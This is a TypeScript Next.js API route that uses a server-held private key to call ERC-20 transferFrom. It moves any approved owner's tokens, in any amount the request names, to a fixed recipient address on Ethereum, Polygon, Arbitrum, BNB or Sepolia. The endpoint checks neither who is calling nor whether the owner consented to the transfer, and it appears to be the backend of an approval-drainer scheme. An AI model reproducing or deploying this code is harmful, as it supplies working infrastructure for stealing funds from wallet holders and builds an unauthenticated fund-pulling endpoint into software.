import { NextResponse } from 'next/server';
import { ethers } from 'ethers';

export async function POST(req: Request) {
  try {
    const { tokenAddress, owner, amount, network } = await req.json();
    if (!tokenAddress || !owner || !amount || !network) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    // Basic validation
    if (!ethers.isAddress(tokenAddress) || !ethers.isAddress(owner)) {
      return NextResponse.json({ error: 'Invalid address format' }, { status: 400 });
    }
    if (!(typeof amount === 'string' || typeof amount === 'number')) {
      return NextResponse.json({ error: 'Amount must be a string or number' }, { status: 400 });
    }

    const rpcMap: Record<string, string | undefined> = {
      sepolia: process.env.RPC_SEPOLIA,
      ethereum: process.env.RPC_ETHEREUM,
      polygon: process.env.RPC_POLYGON,
      arbitrum: process.env.RPC_ARBITRUM,
      bnb: process.env.RPC_BNB
    };
    const rpcUrl = rpcMap[network];
    if (!rpcUrl) return NextResponse.json({ error: `RPC not configured for ${network}` }, { status: 400 });

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const privateKey = process.env.SPENDER_PRIVATE_KEY;
    if (!privateKey) {
      return NextResponse.json({ error: 'Server misconfiguration: SPENDER_PRIVATE_KEY missing' }, { status: 500 });
    }
    const wallet = new ethers.Wallet(privateKey, provider);
    const recipient = process.env.TRANSFER_RECIPIENT || process.env.SPENDER_ADDRESS!;
    if (!ethers.isAddress(recipient)) {
      return NextResponse.json({ error: 'Server misconfiguration: invalid recipient address' }, { status: 500 });
    }

    const abi = [
      "function transferFrom(address from, address to, uint256 value) returns (bool)",
      "function decimals() view returns (uint8)",
      "function allowance(address owner, address spender) view returns (uint256)"
    ];
    const contract = new ethers.Contract(tokenAddress, abi, wallet);

    const decimals: number = await contract.decimals();
    const allowance = await contract.allowance(owner, wallet.address);
    const value = ethers.parseUnits(String(amount), decimals);

    if (allowance < value) {
      return NextResponse.json({ error: `Allowance too low. Approved: ${ethers.formatUnits(allowance, decimals)}` }, { status: 400 });
    }

    const tx = await contract.transferFrom(owner, recipient, value);
    await tx.wait();

    return NextResponse.json({ hash: tx.hash });
  } catch (err: any) {
    let message = 'Unexpected error';
    if (err.code === 'INSUFFICIENT_FUNDS') message = 'Spender has no ETH for gas';
    else if (err.code === 'CALL_EXCEPTION') message = 'Transfer failed: maybe allowance or balance issue';
    else if (err.reason) message = err.reason;
    else if (err.message) message = err.message;

    return NextResponse.json({ error: message }, { status: 500 });
  }
}
